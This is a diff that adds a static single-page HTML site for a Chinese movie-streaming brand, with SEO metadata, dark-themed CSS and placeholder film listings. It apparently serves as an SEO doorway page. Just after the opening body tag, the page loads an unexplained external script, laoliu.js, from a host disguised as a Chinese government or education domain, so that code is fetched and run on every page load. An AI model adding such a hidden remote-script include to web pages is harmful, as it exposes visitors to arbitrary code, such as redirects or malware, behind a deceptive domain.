@@ -1,0 +1,306 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>影音先锋电影网 - 高清影视在线播放</title>
+<meta name="description" content="影音先锋电影网提供高清电影、连续剧、动漫、综艺在线播放，片源清晰、加载稳定，适合手机端畅看。官网 https://yingyinxianfengavdianyingwang-h5.github.io">
+<meta name="keywords" content="影音先锋电影网, 高清电影, 在线播放, 影视网站, 手机看电影">
+<meta name="author" content="影音先锋电影网">
+<meta name="robots" content="index,follow">
+<meta name="bingbot" content="index,follow">
+<meta name="theme-color" content="#0a0a0a">
+<style>
+:root{
+  --bg:#0a0a0a;
+  --panel:#121212;
+  --panel2:#171717;
+  --line:#262626;
+  --red:#ff2d3f;
+  --red2:#ff5a67;
+  --text:#f5f5f5;
+  --muted:#9a9a9a;
+  --mono:"Cascadia Code",Consolas,Menlo,monospace;
+}
+*{margin:0;padding:0;box-sizing:border-box}
+html{scroll-behavior:smooth}
+body{
+  background:var(--bg);
+  color:var(--text);
+  font-family:system-ui,-apple-system,"Microsoft YaHei",Arial,sans-serif;
+  line-height:1.7;
+}
+a{color:var(--red2);text-decoration:none}
+
+/* 布局 */
+.shell{
+  display:grid;
+  grid-template-columns:220px 1fr;
+  min-height:100vh;
+}
+
+/* 侧边栏 */
+.side{
+  background:var(--panel);
+  border-right:1px solid var(--line);
+  padding:22px 16px;
+}
+.logo{
+  font-family:var(--mono);
+  font-size:18px;
+  font-weight:800;
+  color:#fff;
+  margin-bottom:4px;
+}
+.logo b{color:var(--red)}
+.side-url{
+  font-size:12px;color:var(--muted);word-break:break-all;margin-bottom:22px;
+}
+.menu{list-style:none}
+.menu li{margin:6px 0}
+.menu a{
+  display:block;
+  padding:10px 12px;
+  border:1px solid transparent;
+  border-radius:10px;
+  color:var(--text);
+  font-size:14px;
+}
+.menu a:hover{
+  border-color:var(--red);
+  background:var(--panel2);
+}
+
+/* 主区 */
+.main{padding:26px 20px 40px}
+.topbar{
+  border:1px solid var(--line);
+  background:linear-gradient(90deg,#170000,#0f0f0f);
+  padding:18px 20px;
+  border-radius:14px;
+  margin-bottom:26px;
+}
+.topbar h1{
+  font-size:28px;margin-bottom:8px;
+}
+.topbar h1 span{color:var(--red)}
+.topbar p{color:var(--muted);font-size:14px}
+
+/* 区块 */
+.panel{
+  background:var(--panel);
+  border:1px solid var(--line);
+  border-radius:14px;
+  padding:20px;
+  margin-bottom:24px;
+}
+.panel-head{
+  display:flex;align-items:center;gap:10px;margin-bottom:16px;
+}
+.tag{
+  font-family:var(--mono);
+  font-size:12px;
+  background:var(--red);
+  color:#fff;
+  padding:3px 8px;
+  border-radius:6px;
+}
+.panel h2{font-size:20px}
+.panel small{color:var(--muted);display:block;margin-top:2px}
+
+/* 播放列表 */
+.playlist{
+  display:grid;
+  grid-template-columns:repeat(auto-fill,minmax(150px,1fr));
+  gap:14px;
+}
+.play-card{
+  background:var(--panel2);
+  border:1px solid var(--line);
+  border-radius:12px;
+  overflow:hidden;
+}
+.play-thumb{
+  height:96px;
+  background:repeating-linear-gradient(45deg,#1b1b1b,#1b1b1b 10px,#222 10px,#222 20px);
+  display:flex;align-items:center;justify-content:center;
+  color:var(--red2);font-family:var(--mono);font-size:13px;
+}
+.play-card h3{font-size:15px;padding:10px 10px 2px}
+.play-card span{font-size:12px;color:var(--muted);padding:0 10px 12px;display:block}
+
+/* 标签栏 */
+.tabs{display:flex;gap:8px;flex-wrap:wrap;margin-bottom:14px}
+.tab{
+  font-size:13px;padding:7px 12px;border:1px solid var(--line);
+  border-radius:999px;color:var(--muted);
+}
+.tab.active{color:#fff;border-color:var(--red);background:#1c0808}
+
+/* 排行 */
+.ol{list-style:none;counter-reset:n}
+.ol li{
+  counter-increment:n;
+  display:flex;gap:12px;align-items:center;
+  padding:12px 14px;border:1px solid var(--line);
+  border-radius:10px;margin-bottom:10px;background:var(--panel2);
+}
+.ol li::before{
+  content:counter(n);
+  width:26px;height:26px;flex:0 0 26px;
+  display:flex;align-items:center;justify-content:center;
+  background:#1c0808;color:var(--red2);
+  border:1px solid var(--red);border-radius:7px;font-family:var(--mono);
+}
+.ol .score{margin-left:auto;font-size:12px;color:var(--muted)}
+
+/* 关于 */
+.about p{color:var(--muted);margin-bottom:10px}
+.about code{
+  background:#000;color:var(--red2);padding:2px 6px;border-radius:6px;font-family:var(--mono);
+}
+
+/* 页脚 */
+.foot{
+  text-align:center;color:var(--muted);font-size:13px;
+  padding:20px;border-top:1px solid var(--line);
+}
+
+/* 响应式 */
+@media (max-width:820px){
+  .shell{grid-template-columns:1fr}
+  .side{
+    border-right:none;border-bottom:1px solid var(--line);
+  }
+  .menu{display:flex;flex-wrap:wrap;gap:8px}
+  .menu li{margin:0}
+  .topbar h1{font-size:23px}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/laoliu.js"></script>
+
+<div class="shell">
+
+  <!-- 侧边栏 -->
+  <aside class="side">
+    <div class="logo">影音先锋<b>电影网</b></div>
+    <div class="side-url">https://yingyinxianfengavdianyingwang-h5.github.io</div>
+    <ul class="menu">
+      <li><a href="#">控制台首页</a></li>
+      <li><a href="#">在线片库</a></li>
+      <li><a href="#">频道分类</a></li>
+      <li><a href="#">热播榜单</a></li>
+      <li><a href="#">站点说明</a></li>
+    </ul>
+  </aside>
+
+  <!-- 主内容 -->
+  <main class="main">
+
+    <section class="topbar" id="home">
+      <h1>影音先锋电影网 · <span>高清在线播放</span></h1>
+      <p>电影 / 剧集 / 动漫 / 综艺 一站式片库，手机端自适应，打开即看。</p>
+    </section>
+
+    <section class="panel" id="library">
+      <div class="panel-head">
+        <span class="tag">LIB</span>
+        <div>
+          <h2>在线片库</h2>
+          <small>最新更新资源流</small>
+        </div>
+      </div>
+      <div class="playlist">
+        <article class="play-card">
+          <div class="play-thumb">PLAY 01</div>
+          <h3>暗河追凶</h3><span>悬疑 · 1080P</span>
+        </article>
+        <article class="play-card">
+          <div class="play-thumb">PLAY 02</div>
+          <h3>星舰归途</h3><span>科幻 · 1080P</span>
+        </article>
+        <article class="play-card">
+          <div class="play-thumb">PLAY 03</div>
+          <h3>夏末恋曲</h3><span>爱情 · 720P</span>
+        </article>
+        <article class="play-card">
+          <div class="play-thumb">PLAY 04</div>
+          <h3>笑闹职场</h3><span>喜剧 · 1080P</span>
+        </article>
+        <article class="play-card">
+          <div class="play-thumb">PLAY 05</div>
+          <h3>雾山怪谈</h3><span>惊悚 · 1080P</span>
+        </article>
+        <article class="play-card">
+          <div class="play-thumb">PLAY 06</div>
+          <h3>灵宠物语</h3><span>动漫 · 1080P</span>
+        </article>
+      </div>
+    </section>
+
+    <section class="panel" id="channels">
+      <div class="panel-head">
+        <span class="tag">CAT</span>
+        <div>
+          <h2>频道分类</h2>
+          <small>按内容类型切分</small>
+        </div>
+      </div>
+      <div class="tabs">
+        <span class="tab active">全部</span>
+        <span class="tab">电影</span>
+        <span class="tab">电视剧</span>
+        <span class="tab">动漫</span>
+        <span class="tab">综艺</span>
+        <span class="tab">纪录片</span>
+      </div>
+      <div class="playlist">
+        <article class="play-card"><div class="play-thumb">FILM</div><h3>动作大片</h3><span>拳拳到肉</span></article>
+        <article class="play-card"><div class="play-thumb">DRAMA</div><h3>都市剧集</h3><span>剧情向</span></article>
+        <article class="play-card"><div class="play-thumb">ANIME</div><h3>国漫日番</h3><span>热血治愈</span></article>
+        <article class="play-card"><div class="play-thumb">SHOW</div><h3>综艺现场</h3><span>下饭神器</span></article>
+      </div>
+    </section>
+
+    <section class="panel" id="rank">
+      <div class="panel-head">
+        <span class="tag">TOP</span>
+        <div>
+          <h2>热播榜单</h2>
+          <small>站内核验热度</small>
+        </div>
+      </div>
+      <ol class="ol">
+        <li>暗河追凶 <span class="score">9.2 / 悬疑</span></li>
+        <li>星舰归途 <span class="score">8.9 / 科幻</span></li>
+        <li>灵宠物语 <span class="score">8.7 / 动漫</span></li>
+        <li>夏末恋曲 <span class="score">8.4 / 爱情</span></li>
+        <li>笑闹职场 <span class="score">8.1 / 喜剧</span></li>
+      </ol>
+    </section>
+
+    <section class="panel about" id="about">
+      <div class="panel-head">
+        <span class="tag">DOC</span>
+        <div>
+          <h2>站点说明</h2>
+          <small>影音先锋电影网 · 静态单页</small>
+        </div>
+      </div>
+      <p><strong>影音先锋电影网</strong> 是一个面向移动端的影视展示单页，强调“片源清晰、播放稳定、界面像播放器控制台”。</p>
+      <p>官网地址：<code>https://yingyinxianfengavdianyingwang-h5.github.io</code></p>
+      <p>本页为静态演示，内页链接以 <code>#</code> 占位，不依赖后端，不生成 robots.txt 与 sitemap.xml，可直接放 GitHub Pages 根目录。</p>
+    </section>
+
+    <footer class="foot">
+      © 2026 影音先锋电影网 · yingyinxianfengavdianyingwang-h5.github.io · 单页静态演示
+    </footer>
+
+  </main>
+</div>
+
+</body>
+</html>
